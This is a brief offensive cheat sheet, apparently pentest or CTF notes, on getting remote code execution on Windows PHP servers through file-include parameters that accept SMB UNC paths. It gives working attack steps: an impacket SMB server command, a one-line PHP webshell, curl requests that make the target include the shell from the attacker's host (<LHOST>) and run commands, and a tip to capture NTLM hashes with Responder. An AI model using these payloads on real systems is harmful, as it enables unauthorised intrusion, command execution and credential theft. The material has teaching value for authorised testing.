# RFI via SMB UNC Path (Windows PHP Include)

On Windows PHP servers, file include parameters accept UNC paths (`\\<IP>\share\file`). Serve a malicious PHP file over SMB to get RCE.

## Setup SMB Share with Webshell
```bash
# Start impacket SMB server
impacket-smbserver share /tmp/share -smb2support

# Or with Responder
# Create webshell in /tmp/share/shell.php
```

`/tmp/share/shell.php`:
```php
<?php system($_GET['cmd']); ?>
```

## Trigger via URL
```bash
curl "http://<TARGET>/blog/?lang=\\\\<LHOST>\\share\\shell.php&cmd=whoami"
# URL encoded:
curl "http://<TARGET>/blog/?lang=%5C%5C<LHOST>%5Cshare%5Cshell.php&cmd=whoami"
```

## Notes
- Only works on Windows PHP servers (UNC paths resolved natively)
- `allow_url_include = On` not required for UNC paths on Windows (treated as local filesystem paths)
- PHP `include $_GET['lang']` must not sanitize backslashes
- If SMB requires auth, use Responder to capture NTLM hashes instead
